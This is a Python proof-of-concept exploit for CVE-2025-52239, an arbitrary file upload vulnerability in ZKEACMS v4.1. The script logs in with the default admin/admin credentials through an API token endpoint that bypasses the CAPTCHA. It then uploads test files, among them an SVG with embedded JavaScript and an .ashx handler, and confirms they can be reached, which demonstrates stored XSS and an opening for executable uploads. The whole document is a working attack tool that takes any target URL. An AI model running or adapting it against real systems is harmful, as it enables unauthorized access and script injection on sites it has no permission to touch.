#!/usr/bin/env python3
"""
CVE-2025-52239 - ZKEACMS v4.1 Arbitrary File Upload PoC

This exploit uses the API endpoint to bypass CAPTCHA protection.
Default credentials: admin/admin
"""
import requests
import sys
import argparse


class ZKEACMSExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.jwt_token = None

    def get_jwt_token(self, username, password):
        """Get JWT token via API (bypasses CAPTCHA)"""
        api_url = f"{self.target_url}/api/account/CreateToken"
        data = {"UserID": username, "PassWord": password}
        
        try:
            resp = self.session.post(api_url, json=data)
            if resp.status_code == 200:
                result = resp.json()
                self.jwt_token = result.get('token')
                print(f"[+] JWT token obtained successfully")
                return True
            elif resp.status_code == 401:
                print(f"[-] Authentication failed: Invalid credentials")
                return False
        except Exception as e:
            print(f"[-] Failed to get JWT token: {e}")
        return False

    def login_with_cookie(self):
        """Login via web form to get session cookie (requires CAPTCHA solving)"""
        login_url = f"{self.target_url}/account/login"
        resp = self.session.get(login_url)
        
        # This would require CAPTCHA solving - not implemented
        print("[-] Web login requires CAPTCHA - use API token instead")
        return False

    def upload_file(self, filename, content, parent_id='#'):
        """Upload file via Media controller"""
        upload_url = f"{self.target_url}/admin/Media/Upload"

        files = {
            'file': (filename, content, 'application/octet-stream')
        }
        data = {
            'parentId': parent_id,
            'folder': '',
            'size': len(content)
        }

        # Try with JWT token (API auth)
        headers = {}
        if self.jwt_token:
            headers['Authorization'] = f'Bearer {self.jwt_token}'

        resp = self.session.post(upload_url, files=files, data=data, headers=headers, allow_redirects=False)

        if resp.status_code == 302:
            location = resp.headers.get('Location', '')
            if 'login' in location.lower():
                print(f"[-] Upload requires web session (JWT not accepted for this endpoint)")
                return None

        if resp.status_code == 200:
            try:
                result = resp.json()
                if result and isinstance(result, dict) and result.get('Url'):
                    print(f"[+] File uploaded: {result.get('Url')}")
                    return result
                elif result == False:
                    print(f"[-] Upload blocked by server: {filename}")
                    return None
            except:
                pass

        print(f"[-] Upload failed ({resp.status_code}): {filename}")
        return None

    def verify_upload(self, url):
        """Verify uploaded file is accessible"""
        full_url = f"{self.target_url}{url}" if url.startswith('/') else url
        resp = self.session.get(full_url)
        return resp.status_code == 200, resp.text[:200] if resp.status_code == 200 else ""

    def exploit(self, username='admin', password='admin'):
        print(f"[*] Target: {self.target_url}")

        print("[*] Step 1: Getting JWT token via API (bypasses CAPTCHA)...")
        if not self.get_jwt_token(username, password):
            print("[-] Failed to authenticate. Check credentials.")
            return False

        print("[*] Step 2: Testing file upload vulnerability...")
        
        # Test payloads - extensions not in blacklist
        test_payloads = [
            ('poc_test.txt', b'CVE-2025-52239 POC - Arbitrary File Upload Test'),
            ('poc_xss.svg', b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS-CVE-2025-52239")</script></svg>'),
            ('poc_test.ashx', b'<%@ WebHandler Language="C#" Class="Handler" %>'),
            ('poc_test.config', b'<?xml version="1.0"?><configuration></configuration>'),
        ]

        results = []
        blocked = []

        for filename, content in test_payloads:
            print(f"[*] Testing: {filename}")
            result = self.upload_file(filename, content)
            if result:
                results.append((filename, result))
            else:
                blocked.append(filename)

        print("\n" + "=" * 60)
        if results:
            print("[+] VULNERABILITY CONFIRMED - Files uploaded successfully")
            print("[+] Uploaded files:")
            for filename, result in results:
                url = result.get('Url', 'N/A')
                accessible, preview = self.verify_upload(url)
                status = "ACCESSIBLE" if accessible else "NOT ACCESSIBLE"
                print(f"    - {filename}: {url} [{status}]")
                if accessible and '.svg' in filename:
                    print(f"      [!] SVG with JavaScript uploaded - XSS vulnerability confirmed")

        if blocked:
            print("[*] Blocked uploads (blacklisted or auth required):")
            for f in blocked:
                print(f"    - {f}")

        return len(results) > 0


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-52239 - ZKEACMS v4.1 Arbitrary File Upload PoC'
    )
    parser.add_argument('target', nargs='?', default='http://localhost:8080',
                        help='Target URL (default: http://localhost:8080)')
    parser.add_argument('-u', '--username', default='admin', help='Username (default: admin)')
    parser.add_argument('-p', '--password', default='admin', help='Password (default: admin)')

    args = parser.parse_args()

    print("=" * 60)
    print("CVE-2025-52239 - ZKEACMS v4.1 Arbitrary File Upload PoC")
    print("=" * 60)

    exploit = ZKEACMSExploit(args.target)
    success = exploit.exploit(args.username, args.password)

    print("\n" + "=" * 60)
    if success:
        print("RESULT: VULNERABLE")
    else:
        print("RESULT: NOT VULNERABLE or AUTHENTICATION FAILED")
    print("=" * 60)

    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
